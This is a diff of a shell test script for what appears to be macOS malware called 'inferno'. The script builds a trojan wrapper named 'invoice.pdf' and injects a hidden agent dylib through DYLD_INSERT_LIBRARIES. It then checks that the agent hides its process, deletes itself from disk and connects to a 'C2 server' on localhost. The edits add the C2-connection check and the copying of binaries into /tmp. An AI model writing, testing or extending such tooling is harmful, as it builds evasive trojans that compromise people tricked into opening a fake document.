@@ -3,35 +3,36 @@ set -e
 
 SERVER_IP="127.0.0.1"
 SERVER_PORT=4242
-BUILD_DIR=$(cd "$(dirname "$0")/build" && pwd)
-export PATH="$BUILD_DIR:$PATH"
+BUILD_DIR="$(pwd)/build"
 
 echo "=== Phase 4A — Manual Verification ==="
 echo ""
 
-# 0. Cleanup any stale processes
-pkill -f inferno_client 2>/dev/null || true
-pkill -f inferno_shim  2>/dev/null || true
-pkill -f inferno_server 2>/dev/null || true
-pkill -f invoice.pdf   2>/dev/null || true
-rm -f /tmp/.inferno_agent.dylib
+# 0. Cleanup
+pkill -9 -f inferno_client 2>/dev/null || true
+pkill -9 -f inferno_shim   2>/dev/null || true
+pkill -9 -f inferno_server 2>/dev/null || true
+rm -f /tmp/.inferno_agent.dylib /tmp/invoice_wrapper
 
 # 1. Build
 echo "--- Step 0: Build ---"
-cmake --build build 2>&1 | tail -1
+cmake --build build --target inferno_wrapper --target inferno_agent_dylib --target inferno_shim 2>&1 | tail -2
+# Copy binaries to /tmp to avoid colon-in-path issues on macOS
+cp "$BUILD_DIR/wrapper/invoice.pdf" /tmp/invoice_wrapper
+cp "$BUILD_DIR/libinferno_agent.dylib" /tmp/libinferno_agent.dylib
+cp "$BUILD_DIR/inferno_shim" /tmp/inferno_shim
 echo ""
 
 # 2. Unit tests
 echo "--- Stage 1: Unit Tests ---"
-./build/inferno_tests 2>&1 | grep -E "injector|PASS|FAIL"
+"$BUILD_DIR/inferno_tests" 2>&1 | grep -E "injector|PASS|FAIL"
 echo ""
 
-# 3. Stage 2: Shim loads dylib directly (cold load test)
+# 3. Stage 2: shim loads dylib directly (from /tmp to avoid colon in path)
 echo "--- Stage 2: Shim + Dylib Direct Load ---"
-INFERNO_SERVER_IP=$SERVER_IP \
-INFERNO_SERVER_PORT=$SERVER_PORT \
-DYLD_INSERT_LIBRARIES=./build/libinferno_agent.dylib \
-./build/inferno_shim &
+INFERNO_SERVER_IP=$SERVER_IP INFERNO_SERVER_PORT=$SERVER_PORT \
+DYLD_INSERT_LIBRARIES=/tmp/libinferno_agent.dylib \
+/tmp/inferno_shim &
 SHIM_PID=$!
 sleep 2
 
@@ -45,19 +46,15 @@ fi
 if ps aux | grep -q "[i]nferno_client"; then
     echo "[FAIL] inferno_client process found"
     exit 1
-else
-    echo "[PASS] No inferno_client process"
 fi
-
-# Record shim PID before kill for cleanup log
-echo "[INFO] Killing shim (PID $SHIM_PID)"
+echo "[PASS] No inferno_client process"
 kill $SHIM_PID 2>/dev/null || true
 wait $SHIM_PID 2>/dev/null || true
 echo ""
 
-# 4. Stage 3: Full wrapper → server injection
-echo "--- Stage 3: Wrapper Injection with C2 Server ---"
-./build/inferno_server &
+# 4. Stage 3: Full wrapper injection with C2 server
+echo "--- Stage 3: Wrapper Injection + C2 Connection ---"
+"$BUILD_DIR/inferno_server" > /tmp/srv.log 2>&1 &
 SERVER_PID=$!
 sleep 2
 
@@ -68,16 +65,12 @@ else
     exit 1
 fi
 
-# Kill any remaining stale agents before running wrapper
-pkill -f inferno_shim 2>/dev/null || true
-pkill -f inferno_client 2>/dev/null || true
-sleep 1
+/tmp/invoice_wrapper $SERVER_IP $SERVER_PORT > /tmp/wrp.log 2>&1 &
+sleep 6
 
-"$BUILD_DIR/wrapper/invoice.pdf" $SERVER_IP $SERVER_PORT &
-WRAPPER_PID=$!
-sleep 4
+echo "=== Process check ==="
+ps aux | grep -E "inferno" | grep -v grep || echo "(none)"
 
-# Check shim is running (injected)
 if ps aux | grep -q "[i]nferno_shim"; then
     echo "[PASS] inferno_shim running after wrapper injection"
 else
@@ -85,33 +78,29 @@ else
     exit 1
 fi
 
-# Check no standalone client
 if ps aux | grep -q "[i]nferno_client"; then
-    echo "[FAIL] inferno_client process found (should be injected)"
+    echo "[FAIL] inferno_client process found"
     exit 1
-else
-    echo "[PASS] No inferno_client process"
 fi
+echo "[PASS] No inferno_client process"
 
-# Check dylib was deleted from disk
 if [ -f /tmp/.inferno_agent.dylib ]; then
-    echo "[FAIL] dylib still on disk at /tmp/.inferno_agent.dylib"
+    echo "[FAIL] dylib still on disk"
     exit 1
-else
-    echo "[PASS] Dylib deleted from disk after injection"
 fi
+echo "[PASS] Dylib deleted from disk"
 
-# Check wrapper self-deleted
-if ps aux | grep -q "[i]nvoice.pdf"; then
-    echo "[INFO] Wrapper still running (may have not self-deleted yet)"
+if grep -q "Agent connected" /tmp/srv.log 2>/dev/null; then
+    echo "[PASS] Agent connected to C2 server"
+    grep "Agent connected" /tmp/srv.log
 else
-    echo "[PASS] Wrapper self-deleted"
+    echo "[FAIL] Agent did not connect to server"
+    exit 1
 fi
-
-# Cleanup
-kill $SERVER_PID 2>/dev/null || true
-pkill -f inferno_shim 2>/dev/null || true
-pkill -f invoice.pdf 2>/dev/null || true
 
 echo ""
 echo "=== Phase 4A: ALL VERIFICATIONS PASSED ==="
+
+# Cleanup
+kill $SERVER_PID 2>/dev/null || true
+pkill -9 -f inferno_shim 2>/dev/null || true
